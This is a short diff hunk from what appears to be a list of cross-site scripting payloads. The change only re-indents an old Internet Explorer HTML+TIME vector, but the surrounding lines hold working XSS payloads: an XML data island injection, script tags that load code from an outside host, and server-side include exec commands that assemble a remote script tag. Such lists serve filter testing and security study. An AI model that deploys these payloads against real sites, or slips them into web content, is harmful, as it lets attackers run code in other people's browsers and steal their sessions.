@@ -521,9 +521,9 @@ eval(v+l+a+b);
 
 <XML SRC="CrossSiteScriptingtest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 <HTML><BODY>
-<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
-<?import namespace="t" implementation="#default#time2">
-<t:set attributeName="innerHTML" to="CrossSiteScripting<SCRIPT DEFER>alert("CrossSiteScripting")</SCRIPT>">
+    <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+    <?import namespace="t" implementation="#default#time2">
+    <t:set attributeName="innerHTML" to="CrossSiteScripting<SCRIPT DEFER>alert("CrossSiteScripting")</SCRIPT>">
 </BODY></HTML>
 <SCRIPT SRC="http://vulnerability-lab.com/CrossSiteScripting.jpg"></SCRIPT>
 <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js></SCRIPT>'"-->
